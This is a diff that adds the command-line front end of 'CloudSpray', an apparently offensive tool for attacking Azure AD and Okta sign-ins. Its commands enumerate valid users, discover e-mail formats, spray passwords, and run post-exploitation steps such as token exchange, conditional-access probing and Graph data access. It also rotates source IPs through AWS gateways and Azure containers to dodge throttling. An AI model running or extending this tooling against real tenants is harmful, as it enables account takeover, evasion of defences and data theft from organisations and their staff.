@@ -1,0 +1,949 @@
+"""Click CLI commands: enum, spray, post, report, format."""
+
+import random
+import time
+
+import click
+import requests
+
+from cloudspray.settings import CloudSprayConfig, load_config, validate_shuffle_mode
+from cloudspray.proxy import AWSGatewayProvider, AzureACIProvider, ProxyManager
+from cloudspray.proxy.session import FireproxSession
+from cloudspray.reporting.console import ConsoleReporter
+from cloudspray.state.db import StateDB
+from cloudspray.utils import setup_logging
+
+
+class MutuallyExclusive(click.Option):
+    """Click option subclass that enforces mutual exclusivity with another option.
+
+    Used for ``--passwords`` vs ``--password`` in the spray command -- the user
+    must provide exactly one of them, not both.
+
+    Usage::
+
+        @click.option("-p", "--passwords", cls=MutuallyExclusive,
+                      mutually_exclusive=["password"])
+
+    Args:
+        mutually_exclusive: List of option names that cannot be used alongside
+            this option.
+    """
+
+    def __init__(self, *args, **kwargs):
+        self.mutually_exclusive = set(kwargs.pop("mutually_exclusive", []))
+        super().__init__(*args, **kwargs)
+
+    def handle_parse_result(self, ctx, opts, args):
+        """Check for conflicts and raise ``UsageError`` if both options are set."""
+        current = self.name in opts and opts[self.name] is not None
+        for other_name in self.mutually_exclusive:
+            if other_name in opts and opts[other_name] is not None and current:
+                raise click.UsageError(
+                    f"--{self.name.replace('_', '-')} and "
+                    f"--{other_name.replace('_', '-')} are mutually exclusive."
+                )
+        return super().handle_parse_result(ctx, opts, args)
+
+
+@click.group()
+@click.option(
+    "--db",
+    type=click.Path(),
+    default="cloudspray.db",
+    show_default=True,
+    help="Path to SQLite state database.",
+)
+@click.option(
+    "--quiet", "-q",
+    is_flag=True,
+    default=False,
+    help="Suppress per-attempt output, show only progress bar and actionable results.",
+)
+@click.option(
+    "--config", "config_path",
+    default=None,
+    type=click.Path(),
+    help="Path to config.json file.",
+)
+@click.pass_context
+def cli(ctx, db, quiet, config_path):
+    """CloudSpray - Azure AD password sprayer and enumerator.
+
+    AWS credentials are loaded from config.json. See config.json.example.
+    """
+    ctx.ensure_object(dict)
+
+    cfg = load_config(config_path)
+    ctx.obj["config"] = cfg
+    ctx.obj["config_path"] = config_path
+    ctx.obj["db_path"] = db
+
+    log_level = "INFO" if quiet else "DEBUG"
+    ctx.obj["logger"] = setup_logging(level=log_level)
+
+    ctx.obj["reporter"] = ConsoleReporter(verbose=not quiet)
+
+
+# Maps enumeration method names to the Microsoft host that handles them.
+# OneDrive is None here because its host is derived from the target domain
+# at runtime (e.g. "example-my.sharepoint.com").
+_ENUM_TARGET_HOSTS = {
+    "msol": "login.microsoftonline.com",
+    "login": "login.microsoftonline.com",
+    "onedrive": None,
+    "teams": "teams.microsoft.com",
+}
+
+# All spray requests go through the main Microsoft login endpoint.
+_SPRAY_TARGET_HOST = "login.microsoftonline.com"
+
+# Common domain suffixes to try when bare tenant name doesn't resolve.
+_DOMAIN_SUFFIXES = [".com", ".onmicrosoft.com", ".org", ".net"]
+
+
+def _discover_tenant(domain: str, reporter: ConsoleReporter) -> str:
+    """Validate a domain resolves to an Azure AD tenant before proceeding.
+
+    Checks the OpenID Connect discovery endpoint to confirm the tenant exists.
+    If the domain as-is doesn't work, tries appending common suffixes
+    (e.g. "example" -> "example.com", "example.onmicrosoft.com").
+
+    Returns the validated domain string, or raises SystemExit if no valid
+    tenant is found.
+    """
+    oidc_url = "https://login.microsoftonline.com/{}/.well-known/openid-configuration"
+
+    # Try the domain as provided first
+    candidates = [domain]
+
+    # If the domain has no dots, it's probably a bare tenant name — try suffixes
+    if "." not in domain:
+        candidates += [f"{domain}{suffix}" for suffix in _DOMAIN_SUFFIXES]
+
+    for candidate in candidates:
+        try:
+            resp = requests.get(oidc_url.format(candidate), timeout=10)
+            if resp.status_code == 200:
+                data = resp.json()
+                tenant_id = data.get("issuer", "").rstrip("/").split("/")[-1] if "issuer" in data else "unknown"
+                reporter.info(f"Tenant found: {candidate} (ID: {tenant_id})")
+                return candidate
+        except requests.RequestException:
+            continue
+
+    # Nothing resolved — show what we tried
+    reporter.error(f"No Azure AD tenant found for '{domain}'")
+    reporter.error(f"Tried: {', '.join(candidates)}")
+    reporter.error("Use a full domain (e.g. example.com) or tenant GUID.")
+    raise SystemExit(1)
+
+
+def _check_federation(domain: str, reporter: ConsoleReporter, force: bool) -> None:
+    """Check if a domain federates to an external IdP and warn/abort."""
+    from cloudspray.recon.discovery import ReconDiscovery
+
+    disco = ReconDiscovery(domain)
+    idp_name, idp_host, fed_url = disco._parse_federation_from_txt()
+
+    if not idp_name:
+        return
+
+    reporter.info("")
+    reporter.error(f"WARNING: {domain} federates authentication to {idp_name} ({idp_host})")
+    reporter.error("Azure AD spray/enum will likely return user_not_found for all federated users.")
+    reporter.info("")
+    reporter.info("Options:")
+    if idp_name == "Okta":
+        reporter.info("  - Use 'okta-spray' command instead")
+    reporter.info("  - Run 'recon' to see full IdP details")
+    reporter.info("  - Pass --force to proceed anyway")
+
+    if not force:
+        reporter.info("")
+        reporter.error("Aborting. Use --force to override.")
+        raise SystemExit(1)
+
+    reporter.info("")
+    reporter.info("--force passed, proceeding despite federation warning.")
+
+
+def _build_proxy_session(
+    config: CloudSprayConfig,
+    target_host: str | None,
+    reporter: ConsoleReporter,
+    backend: str = "auto",
+) -> tuple[ProxyManager | None, FireproxSession | requests.Session | None]:
+    """Create a proxy session for IP rotation during spray/enum operations.
+
+    Supports two backends:
+    - **aws**: Fireprox API Gateway reverse proxies (URL rewriting)
+    - **azure**: Azure Container Instances running tinyproxy (forward proxy)
+
+    The caller is responsible for calling ``proxy_manager.teardown_all()``
+    when done (typically in a ``finally`` block).
+
+    Args:
+        config: Full CloudSpray config with proxy credentials.
+        target_host: The host to proxy to (e.g. "login.microsoftonline.com").
+            If ``None``, proxy setup is skipped.
+        reporter: Console reporter for status messages.
+        backend: Which proxy backend to use. "auto" picks whichever has
+            credentials configured (preferring AWS). "none" skips proxy setup.
+
+    Returns:
+        Tuple of (ProxyManager, session). Both are ``None`` when proxy is
+        disabled, backend is "none", or no credentials are configured.
+
+    Raises:
+        SystemExit: If a specific backend is requested but not configured,
+            or if the health check fails after deployment.
+    """
+    backend = backend.lower()
+
+    if backend == "none" or target_host is None:
+        return None, None
+
+    aws_enabled = config.proxy.aws_gateway.enabled
+    azure_enabled = config.proxy.azure_aci.enabled
+
+    # Determine which backend to use
+    use_aws = False
+    use_azure = False
+
+    if backend == "aws":
+        if not aws_enabled:
+            reporter.error("AWS proxy backend requested but no AWS credentials configured.")
+            raise SystemExit(1)
+        use_aws = True
+    elif backend == "azure":
+        if not azure_enabled:
+            reporter.error("Azure proxy backend requested but no Azure credentials configured.")
+            raise SystemExit(1)
+        use_azure = True
+    elif backend == "auto":
+        if aws_enabled:
+            use_aws = True
+        elif azure_enabled:
+            use_azure = True
+        else:
+            return None, None
+
+    if use_aws:
+        gw_cfg = config.proxy.aws_gateway
+        provider = AWSGatewayProvider(
+            access_key=gw_cfg.access_key,
+            secret_key=gw_cfg.secret_key,
+            regions=gw_cfg.regions,
+        )
+
+        manager = ProxyManager()
+        manager.add_provider(provider)
+        manager.setup_all(f"https://{target_host}")
+
+        reporter.info("Waiting for gateways to propagate...")
+        time.sleep(5)
+
+        if not provider.health_check():
+            reporter.error("Fireprox health check failed, tearing down gateways")
+            manager.teardown_all()
+            raise SystemExit(1)
+
+        reporter.info(f"Fireprox ready: {len(provider._gateway_urls)} gateway(s) active")
+        session = FireproxSession(provider, target_host)
+        return manager, session
+
+    if use_azure:
+        aci_cfg = config.proxy.azure_aci
+        provider = AzureACIProvider(
+            subscription_id=aci_cfg.subscription_id,
+            client_id=aci_cfg.client_id,
+            client_secret=aci_cfg.client_secret,
+            tenant_id=aci_cfg.tenant_id,
+            regions=aci_cfg.regions,
+            container_count=aci_cfg.container_count,
+        )
+
+        manager = ProxyManager()
+        manager.add_provider(provider)
+        manager.setup_all(f"https://{target_host}")
+
+        reporter.info("Waiting for ACI containers to start...")
+        time.sleep(10)
+
+        if not provider.health_check():
+            reporter.error("ACI health check failed, tearing down containers")
+            manager.teardown_all()
+            raise SystemExit(1)
+
+        reporter.info(f"ACI proxy ready: {len(provider._container_ips)} container(s) active")
+
+        # ACI uses forward proxy, not URL rewriting like Fireprox
+        session = requests.Session()
+        provider_ref = provider
+
+        original_request = requests.Session.request
+
+        def proxied_request(self, method, url, **kwargs):
+            proxy_url = provider_ref.get_proxy_url()
+            kwargs.setdefault("proxies", {})
+            kwargs["proxies"]["https"] = proxy_url
+            kwargs["proxies"]["http"] = proxy_url
+            session.last_proxy_url = proxy_url
+            return original_request(self, method, url, **kwargs)
+
+        session.request = proxied_request.__get__(session)
+        session.last_proxy_url = ""
+
+        return manager, session
+
+    return None, None
+
+
+@cli.command("enum")
+@click.option("-d", "--domain", required=True, help="Target domain.")
+@click.option(
+    "-u", "--users", required=True,
+    type=click.Path(exists=True),
+    help="Path to user list file.",
+)
+@click.option(
+    "-m", "--method",
+    type=click.Choice(["onedrive", "teams", "msol", "login"], case_sensitive=False),
+    default="onedrive",
+    show_default=True,
+    help="Enumeration method.",
+)
+@click.option(
+    "-o", "--output",
+    type=click.Path(),
+    default=None,
+    help="Path to write valid usernames.",
+)
+@click.option("--teams-user", default=None, help="Teams auth username (for teams method).")
+@click.option("--teams-pass", default=None, help="Teams auth password (for teams method).")
+@click.option("--force", is_flag=True, default=False, help="Proceed even if domain federates to external IdP.")
+@click.option(
+    "--proxy-backend",
+    type=click.Choice(["auto", "aws", "azure", "none"], case_sensitive=False),
+    default="auto",
+    help="Proxy backend for IP rotation. 'auto' uses whichever has credentials configured.",
+)
+@click.pass_context
+def enum_cmd(ctx, domain, users, method, output, teams_user, teams_pass, force, proxy_backend):
+    """Enumerate valid Azure AD users."""
+    cfg = ctx.obj["config"]
+    reporter = ctx.obj["reporter"]
+
+    reporter.banner()
+
+    # Validate tenant before doing anything expensive
+    domain = _discover_tenant(domain, reporter)
+
+    _check_federation(domain, reporter, force)
+
+    # Override config with CLI args
+    cfg.target.domain = domain
+    if teams_user:
+        cfg.enum.teams_user = teams_user
+    if teams_pass:
+        cfg.enum.teams_pass = teams_pass
+
+    # Validate teams creds when using teams method
+    if method == "teams" and (not cfg.enum.teams_user or not cfg.enum.teams_pass):
+        reporter.error("Teams method requires --teams-user and --teams-pass.")
+        raise SystemExit(1)
+
+    from cloudspray.enumerators import OneDriveEnumerator, TeamsEnumerator, MSOLEnumerator, LoginEnumerator
+    from cloudspray.utils import read_userlist
+
+    userlist = read_userlist(users)
+
+    # Determine target host for proxy routing
+    target_host = _ENUM_TARGET_HOSTS[method]
+    if method == "onedrive":
+        parts = domain.lower().split(".")
+        tenant_slug = parts[-2] if len(parts) >= 2 else parts[0]
+        target_host = f"{tenant_slug}-my.sharepoint.com"
+
+    proxy_manager, proxy_session = _build_proxy_session(cfg, target_host, reporter, proxy_backend)
+
+    try:
+        with StateDB(ctx.obj["db_path"]) as db:
+            reporter.info(f"Enumeration starting: domain={domain}, method={method}")
+            reporter.info(f"User list: {users} ({len(userlist)} entries)")
+
+            if method == "onedrive":
+                enumerator = OneDriveEnumerator(domain, db, reporter, proxy_session=proxy_session)
+                valid = enumerator.enumerate(userlist)
+            elif method == "teams":
+                enumerator = TeamsEnumerator(
+                    domain, db, reporter,
+                    auth_user=cfg.enum.teams_user,
+                    auth_pass=cfg.enum.teams_pass,
+                )
+                valid = enumerator.enumerate(userlist)
+            elif method == "msol":
+                enumerator = MSOLEnumerator(domain, db, reporter, proxy_session=proxy_session)
+                valid = enumerator.enumerate(userlist)
+            elif method == "login":
+                enumerator = LoginEnumerator(domain, db, reporter, proxy_session=proxy_session)
+                valid = enumerator.enumerate(userlist)
+            else:
+                reporter.error(f"Unknown enumeration method: {method}")
+                return
+
+            if output:
+                with open(output, "w", encoding="utf-8") as f:
+                    f.write("\n".join(valid) + "\n")
+                reporter.info(f"Valid users written to {output}")
+
+            reporter.info(f"Enumeration complete: {len(valid)} valid users found")
+    except (KeyboardInterrupt, SystemExit):
+        raise
+    except Exception as exc:
+        reporter.error(f"Enumeration failed: {exc}")
+        raise SystemExit(1) from exc
+    finally:
+        if proxy_manager is not None:
+            reporter.info("Tearing down proxy infrastructure")
+            proxy_manager.teardown_all()
+
+
+@cli.command("spray")
+@click.option("-d", "--domain", required=True, help="Target domain.")
+@click.option(
+    "-u", "--users", required=True,
+    type=click.Path(exists=True),
+    help="Path to user list file.",
+)
+@click.option(
+    "-p", "--passwords",
+    type=click.Path(exists=True),
+    default=None,
+    cls=MutuallyExclusive,
+    mutually_exclusive=["password"],
+    help="Path to password list file.",
+)
+@click.option(
+    "-P", "--password",
+    default=None,
+    cls=MutuallyExclusive,
+    mutually_exclusive=["passwords"],
+    help="Single password string.",
+)
+@click.option("--delay", type=click.IntRange(min=0), default=None, help="Seconds between attempts per user.")
+@click.option("--jitter", type=click.IntRange(min=0), default=None, help="Random jitter range in seconds.")
+@click.option("--lockout-threshold", type=click.IntRange(min=1), default=None, help="Hard stop after N consecutive lockouts.")
+@click.option("--lockout-cooldown", type=click.IntRange(min=0), default=None, help="Per-user lockout cooldown in seconds (default 1800).")
+@click.option(
+    "--shuffle",
+    type=click.Choice(["standard", "aggressive"], case_sensitive=False),
+    default=None,
+    help="Shuffle mode for spray ordering.",
+)
+@click.option("--resume", is_flag=True, default=False, help="Resume from database state.")
+@click.option("--force", is_flag=True, default=False, help="Proceed even if domain federates to external IdP.")
+@click.option(
+    "--proxy-backend",
+    type=click.Choice(["auto", "aws", "azure", "none"], case_sensitive=False),
+    default="auto",
+    help="Proxy backend for IP rotation. 'auto' uses whichever has credentials configured.",
+)
+@click.pass_context
+def spray_cmd(ctx, domain, users, passwords, password, delay, jitter,
+              lockout_threshold, lockout_cooldown, shuffle, resume, force, proxy_backend):
+    """Run a password spray against Azure AD."""
+    cfg = ctx.obj["config"]
+    reporter = ctx.obj["reporter"]
+
+    reporter.banner()
+
+    if not passwords and not password:
+        reporter.error("Provide either -p/--passwords (file) or -P/--password (single).")
+        raise SystemExit(1)
+
+    # Validate tenant before doing anything expensive
+    domain = _discover_tenant(domain, reporter)
+
+    _check_federation(domain, reporter, force)
+
+    # Override config with CLI args
+    cfg.target.domain = domain
+    if delay is not None:
+        cfg.spray.delay = delay
+    if jitter is not None:
+        cfg.spray.jitter = jitter
+    if lockout_threshold is not None:
+        cfg.spray.lockout_threshold = lockout_threshold
+    if lockout_cooldown is not None:
+        cfg.spray.lockout_cooldown = lockout_cooldown
+    if shuffle is not None:
+        cfg.spray.shuffle_mode = shuffle
+
+    validate_shuffle_mode(cfg.spray.shuffle_mode)
+
+    from cloudspray.spray import Authenticator, SprayEngine
+    from cloudspray.utils import read_userlist, read_password_list, normalize_email
+
+    userlist = [normalize_email(u, domain) for u in read_userlist(users)]
+    if passwords:
+        passlist = read_password_list(passwords)
+    else:
+        passlist = [password]
+
+    proxy_manager, proxy_session = _build_proxy_session(cfg, _SPRAY_TARGET_HOST, reporter, proxy_backend)
+
+    try:
+        with StateDB(ctx.obj["db_path"]) as db:
+            reporter.info(f"Spray engine starting: domain={domain}")
+            reporter.info(f"User list: {users} ({len(userlist)} entries)")
+            reporter.info(
+                f"Delay={cfg.spray.delay}s, Jitter={cfg.spray.jitter}s, "
+                f"Shuffle={cfg.spray.shuffle_mode}"
+            )
+            authenticator = Authenticator(cfg.target.domain, proxy_session=proxy_session)
+            engine = SprayEngine(cfg, db, authenticator, reporter)
+            engine.run(userlist, passlist, resume=resume)
+    except (KeyboardInterrupt, SystemExit):
+        raise
+    except Exception as exc:
+        reporter.error(f"Spray failed: {exc}")
+        raise SystemExit(1) from exc
+    finally:
+        if proxy_manager is not None:
+            reporter.info("Tearing down proxy infrastructure")
+            proxy_manager.teardown_all()
+
+
+@cli.command("post")
+@click.option("--foci", is_flag=True, default=False, help="Perform FOCI token exchange.")
+@click.option("--ca-probe", is_flag=True, default=False, help="Probe conditional access policy gaps.")
+@click.option("--exfil", is_flag=True, default=False, help="Lightweight data access check.")
+@click.option("--user", default=None, help="Target specific user from valid credentials.")
+@click.pass_context
+def post_cmd(ctx, foci, ca_probe, exfil, user):
+    """Post-exploitation actions on valid credentials."""
+    reporter = ctx.obj["reporter"]
+
+    reporter.banner()
+
+    if not foci and not ca_probe and not exfil:
+        reporter.error("Specify at least one action: --foci, --ca-probe, or --exfil.")
+        raise SystemExit(1)
+
+    from cloudspray.post import TokenManager, CAProbe, GraphExfil
+
+    cfg = ctx.obj["config"]
+
+    try:
+        with StateDB(ctx.obj["db_path"]) as db:
+            creds = db.get_valid_credentials()
+            if not creds:
+                reporter.error("No valid credentials in database. Run 'spray' first.")
+                raise SystemExit(1)
+
+            reporter.info(f"Post-exploitation: {len(creds)} valid credential(s) available.")
+            if user:
+                reporter.info(f"Targeting user: {user}")
+
+            if foci:
+                token_mgr = TokenManager(cfg.target.domain, db, reporter)
+                results = token_mgr.exchange_all_valid_credentials()
+                for username, tokens in results.items():
+                    reporter.info(f"  {username}: {len(tokens)} tokens captured")
+
+            if ca_probe:
+                prober = CAProbe(cfg.target.domain, db, reporter)
+                probe_results = prober.probe_all_blocked()
+                prober.print_matrix(probe_results)
+
+            if exfil:
+                with GraphExfil(db, reporter) as exfiltrator:
+                    if user:
+                        exfiltrator.run_all(user)
+                    else:
+                        for cred in creds:
+                            exfiltrator.run_all(cred.username)
+    except (KeyboardInterrupt, SystemExit):
+        raise
+    except Exception as exc:
+        reporter.error(f"Post-exploitation failed: {exc}")
+        raise SystemExit(1) from exc
+
+
+@cli.command("report")
+@click.option(
+    "-f", "--format",
+    "output_format",
+    type=click.Choice(["json", "csv"], case_sensitive=False),
+    default="json",
+    show_default=True,
+    help="Report output format.",
+)
+@click.option(
+    "-o", "--output", required=True,
+    type=click.Path(),
+    help="Output file path.",
+)
+@click.option(
+    "--no-redact", is_flag=True, default=False,
+    help="Include plaintext passwords in spray log.",
+)
+@click.pass_context
+def report_cmd(ctx, output_format, output, no_redact):
+    """Generate a report from the database."""
+    reporter = ctx.obj["reporter"]
+
+    reporter.banner()
+
+    from cloudspray.reporting import JSONReporter, CSVReporter
+
+    try:
+        with StateDB(ctx.obj["db_path"]) as db:
+            reporter.info(f"Generating {output_format.upper()} report: {output}")
+
+            if output_format == "json":
+                report_writer = JSONReporter(db)
+            elif output_format == "csv":
+                report_writer = CSVReporter(db)
+            else:
+                reporter.error(f"Unknown report format: {output_format}")
+                return
+
+            report_writer.generate(output, redact_passwords=not no_redact)
+            reporter.info(f"Report written to {output}")
+    except (KeyboardInterrupt, SystemExit):
+        raise
+    except Exception as exc:
+        reporter.error(f"Report generation failed: {exc}")
+        raise SystemExit(1) from exc
+
+
+# Common UPN format patterns. Each is a callable that takes (first, last)
+# and returns the local part (before @domain).
+_FORMAT_PATTERNS = {
+    "first.last":  lambda f, l: f"{f}.{l}",
+    "flast":       lambda f, l: f"{f[0]}{l}",
+    "firstl":      lambda f, l: f"{f}{l[0]}",
+    "firstlast":   lambda f, l: f"{f}{l}",
+    "lastfirst":   lambda f, l: f"{l}{f}",
+    "last.first":  lambda f, l: f"{l}.{f}",
+    "lfirst":      lambda f, l: f"{l[0]}{f}",
+    "first_last":  lambda f, l: f"{f}_{l}",
+    "first-last":  lambda f, l: f"{f}-{l}",
+    "first":       lambda f, l: f,
+    "last":        lambda f, l: l,
+}
+
+
+@cli.command("format")
+@click.option("-d", "--domain", required=True, help="Target domain.")
+@click.option(
+    "-n", "--names", required=True,
+    type=click.Path(exists=True),
+    help="File with full names (one per line, e.g. 'Thomas Cox').",
+)
+@click.option(
+    "--proxy-backend",
+    type=click.Choice(["auto", "aws", "azure", "none"], case_sensitive=False),
+    default="auto",
+    help="Proxy backend for IP rotation. 'auto' uses whichever has credentials configured.",
+)
+@click.pass_context
+def format_cmd(ctx, domain, names, proxy_backend):
+    """Discover the UPN format used by an Azure AD tenant.
+
+    Takes a list of known employee names and tests common email format
+    patterns (first.last, flast, firstl, etc.) against the MSOL
+    GetCredentialType endpoint to find which format the org uses.
+    """
+    reporter = ctx.obj["reporter"]
+    cfg = ctx.obj["config"]
+
+    reporter.banner()
+
+    domain = _discover_tenant(domain, reporter)
+
+    from cloudspray.utils import read_lines
+
+    raw_names = read_lines(names)
+    parsed_names = []
+    for line in raw_names:
+        parts = line.strip().split()
+        if len(parts) < 2:
+            reporter.debug(f"Skipping line (need first + last): {line}")
+            continue
+        parsed_names.append((parts[0].lower(), parts[-1].lower()))
+
+    if not parsed_names:
+        reporter.error("No valid names found. File should have 'First Last' per line.")
+        raise SystemExit(1)
+
+    reporter.info(f"Testing {len(parsed_names)} name(s) against {len(_FORMAT_PATTERNS)} format patterns")
+
+    proxy_manager, proxy_session = _build_proxy_session(
+        cfg, "login.microsoftonline.com", reporter, proxy_backend,
+    )
+
+    try:
+        from cloudspray.enumerators import MSOLEnumerator
+
+        with StateDB(ctx.obj["db_path"]) as db:
+            enumerator = MSOLEnumerator(domain, db, reporter, proxy_session=proxy_session)
+
+            # Track which formats found valid users
+            format_hits: dict[str, list[str]] = {fmt: [] for fmt in _FORMAT_PATTERNS}
+
+            for first, last in parsed_names:
+                for fmt_name, fmt_fn in _FORMAT_PATTERNS.items():
+                    local_part = fmt_fn(first, last)
+                    email = f"{local_part}@{domain}"
+                    result = enumerator.check_user_exists(email)
+
+                    if result is True:
+                        format_hits[fmt_name].append(email)
+                        reporter.info(f"[+] FOUND: {email}  (format: {fmt_name})")
+                    elif result is False:
+                        reporter.debug(f"[-] not found: {email}")
+                    else:
+                        reporter.debug(f"[?] ambiguous: {email}")
+
+                    time.sleep(random.uniform(1.0, 3.0))
+
+            # Summary
+            reporter.info("")
+            reporter.info("=== Format Discovery Results ===")
+            winning_formats = {
+                fmt: hits for fmt, hits in format_hits.items() if hits
+            }
+
+            if not winning_formats:
+                reporter.error("No formats matched any names. Try different names or check the domain.")
+            else:
+                for fmt, hits in sorted(winning_formats.items(), key=lambda x: -len(x[1])):
+                    reporter.info(f"  {fmt}: {len(hits)}/{len(parsed_names)} matched")
+                    for email in hits:
+                        reporter.info(f"    {email}")
+
+                best_format = max(winning_formats, key=lambda f: len(winning_formats[f]))
+                reporter.info(f"\nBest match: {best_format}")
+                reporter.info(f"Use this to build your user list: <username>@{domain}")
+                reporter.info(f"Pattern: {best_format} (e.g. {_FORMAT_PATTERNS[best_format]('john', 'smith')}@{domain})")
+
+    except (KeyboardInterrupt, SystemExit):
+        raise
+    except Exception as exc:
+        reporter.error(f"Format discovery failed: {exc}")
+        raise SystemExit(1) from exc
+    finally:
+        if proxy_manager is not None:
+            reporter.info("Tearing down proxy infrastructure")
+            proxy_manager.teardown_all()
+
+
+@cli.command("recon")
+@click.option("-d", "--domain", required=True, help="Target domain to investigate.")
+@click.pass_context
+def recon_cmd(ctx, domain):
+    """Discover the identity provider and tenant info for a domain.
+
+    Checks Azure AD tenant existence, federation status, DNS TXT records
+    for DirectFedAuthUrl, MX records, and autodiscover CNAME. Tells you
+    whether to spray Azure AD or use okta-spray instead.
+    """
+    reporter = ctx.obj["reporter"]
+    reporter.banner()
+
+    from cloudspray.recon import ReconDiscovery
+
+    disco = ReconDiscovery(domain)
+    result = disco.run(reporter)
+
+    reporter.info("")
+    reporter.info("=== Recon Results ===")
+    reporter.info(f"Domain: {result.domain}")
+
+    if result.tenant_id:
+        reporter.info(f"Tenant ID: {result.tenant_id}")
+    else:
+        reporter.info("Tenant: No Azure AD tenant found")
+
+    if result.namespace_type:
+        reporter.info(f"Namespace: {result.namespace_type}")
+    if result.federation_brand:
+        reporter.info(f"Federation Brand: {result.federation_brand}")
+
+    if result.idp_name:
+        reporter.info(f"Identity Provider: {result.idp_name} ({result.idp_host})")
+        if result.federation_url:
+            reporter.info(f"Federation URL: {result.federation_url}")
+    else:
+        reporter.info("Identity Provider: None detected (likely Azure AD native)")
+
+    if result.mail_provider:
+        reporter.info(f"Mail: {result.mail_provider} ({result.mail_host})")
+    if result.autodiscover_cname:
+        reporter.info(f"Autodiscover: {result.autodiscover_cname}")
+        if result.has_m365:
+            reporter.info("M365 Services: In use (autodiscover points to outlook.com)")
+
+    if result.idp_name and result.idp_name != "Unknown":
+        reporter.info("")
+        reporter.error(f"WARNING: This domain federates to {result.idp_name} ({result.idp_host})")
+        reporter.error("Azure AD ROPC spray will likely fail for federated users.")
+        if result.idp_name == "Okta":
+            reporter.info("Use 'okta-spray' command instead.")
+            if result.idp_host:
+                reporter.info(f"  cloudspray.py okta-spray --okta-url https://{result.idp_host} -d {domain} -u users.txt -p passwords.txt")
+        else:
+            reporter.info(f"This IdP ({result.idp_name}) is not yet supported for spraying.")
+            reporter.info("Use --force with spray/enum to attempt anyway.")
+
+
+@cli.command("okta-spray")
+@click.option("-d", "--domain", required=True, help="Target domain (for email normalization).")
+@click.option("-u", "--users", required=True, type=click.Path(exists=True), help="Path to user list file.")
+@click.option("-p", "--passwords", type=click.Path(exists=True), default=None, cls=MutuallyExclusive, mutually_exclusive=["password"], help="Path to password list file.")
+@click.option("-P", "--password", default=None, cls=MutuallyExclusive, mutually_exclusive=["passwords"], help="Single password string.")
+@click.option("--okta-url", default=None, help="Okta org URL (e.g. https://example.okta.com). Auto-discovered if omitted.")
+@click.option("--delay", type=click.IntRange(min=0), default=None, help="Seconds between attempts per user (default 60).")
+@click.option("--jitter", type=click.IntRange(min=0), default=None, help="Random jitter range in seconds (default 15).")
+@click.option("--lockout-threshold", type=click.IntRange(min=1), default=None, help="Hard stop after N consecutive lockouts.")
+@click.option("--lockout-cooldown", type=click.IntRange(min=0), default=1800, help="Per-user lockout cooldown in seconds (default 1800).")
+@click.option("--resume", is_flag=True, default=False, help="Resume from database state.")
+@click.option(
+    "--proxy-backend",
+    type=click.Choice(["auto", "aws", "azure", "none"], case_sensitive=False),
+    default="auto",
+    help="Proxy backend for IP rotation. 'auto' uses whichever has credentials configured.",
+)
+@click.pass_context
+def okta_spray_cmd(ctx, domain, users, passwords, password, okta_url, delay, jitter, lockout_threshold, lockout_cooldown, resume, proxy_backend):
+    """Spray passwords against an Okta organization.
+
+    Dedicated Okta sprayer with conservative defaults tuned for Okta's
+    aggressive throttling. Uses the /api/v1/authn endpoint directly.
+
+    The Okta URL is auto-discovered from DNS TXT records if --okta-url
+    is not specified.
+    """
+    cfg = ctx.obj["config"]
+    reporter = ctx.obj["reporter"]
+    reporter.banner()
+
+    if not passwords and not password:
+        reporter.error("Provide either -p/--passwords (file) or -P/--password (single).")
+        raise SystemExit(1)
+
+    # Resolve Okta host
+    okta_host = None
+    if okta_url:
+        from urllib.parse import urlparse
+        parsed = urlparse(okta_url if "://" in okta_url else f"https://{okta_url}")
+        okta_host = parsed.hostname
+    else:
+        reporter.info(f"Auto-discovering Okta URL for {domain}...")
+        from cloudspray.recon import ReconDiscovery
+        disco = ReconDiscovery(domain)
+        _, idp_host, _ = disco._parse_federation_from_txt()
+        if idp_host and "okta.com" in idp_host:
+            okta_host = idp_host
+            reporter.info(f"Found Okta: {okta_host}")
+        else:
+            reporter.error("Could not auto-discover Okta URL from DNS TXT records.")
+            reporter.error("Use --okta-url to specify it directly.")
+            raise SystemExit(1)
+
+    # Okta-tuned defaults
+    cfg.spray.delay = delay if delay is not None else 60
+    cfg.spray.jitter = jitter if jitter is not None else 15
+    if lockout_threshold is not None:
+        cfg.spray.lockout_threshold = lockout_threshold
+    cfg.spray.lockout_cooldown = lockout_cooldown
+    validate_shuffle_mode(cfg.spray.shuffle_mode)
+
+    from cloudspray.spray.okta_auth import OktaAuthenticator
+    from cloudspray.spray.engine import SprayEngine
+    from cloudspray.utils import read_userlist, read_password_list, normalize_email
+
+    userlist = [normalize_email(u, domain) for u in read_userlist(users)]
+    passlist = read_password_list(passwords) if passwords else [password]
+
+    proxy_manager, proxy_session = _build_proxy_session(cfg, okta_host, reporter, proxy_backend)
+
+    try:
+        with StateDB(ctx.obj["db_path"]) as db:
+            reporter.info(f"Okta spray starting: {okta_host}")
+            reporter.info(f"User list: {users} ({len(userlist)} entries)")
+            reporter.info(f"Delay={cfg.spray.delay}s, Jitter={cfg.spray.jitter}s (Okta conservative defaults)")
+            authenticator = OktaAuthenticator(okta_host, proxy_session=proxy_session)
+            engine = SprayEngine(cfg, db, authenticator, reporter)
+            engine.run(userlist, passlist, resume=resume)
+    except (KeyboardInterrupt, SystemExit):
+        raise
+    except Exception as exc:
+        reporter.error(f"Okta spray failed: {exc}")
+        raise SystemExit(1) from exc
+    finally:
+        if proxy_manager is not None:
+            reporter.info("Tearing down proxy infrastructure")
+            proxy_manager.teardown_all()
+
+
+@cli.command("footprint")
+@click.option("-d", "--domain", required=True, help="Target domain to footprint.")
+@click.pass_context
+def footprint_cmd(ctx, domain):
+    """Full DNS-based SaaS intelligence dump for a domain.
+
+    Analyzes TXT, MX, SPF, and DMARC records to identify every SaaS
+    service the organization uses.
+    """
+    reporter = ctx.obj["reporter"]
+    reporter.banner()
+
+    from cloudspray.recon import SaaSFootprinter, ReconDiscovery
+
+    disco = ReconDiscovery(domain)
+    recon_result = disco.run(reporter)
+
+    fp = SaaSFootprinter(domain)
+    result = fp.run(reporter)
+
+    reporter.info("")
+    reporter.info(f"=== Footprint: {domain} ===")
+
+    reporter.info("")
+    reporter.info("--- Mail ---")
+    if result.mx_provider:
+        reporter.info(f"MX: {result.mx_provider} ({result.mx_host})")
+    else:
+        reporter.info("MX: No MX records found")
+    if result.spf_services:
+        reporter.info(f"SPF: {', '.join(result.spf_services)}")
+    if result.spf_includes:
+        for inc in result.spf_includes:
+            reporter.debug(f"  include:{inc}")
+    if result.dmarc_policy:
+        reporter.info(f"DMARC: {result.dmarc_policy}")
+        if result.dmarc_record:
+            reporter.debug(f"  {result.dmarc_record}")
+
+    reporter.info("")
+    reporter.info("--- Identity ---")
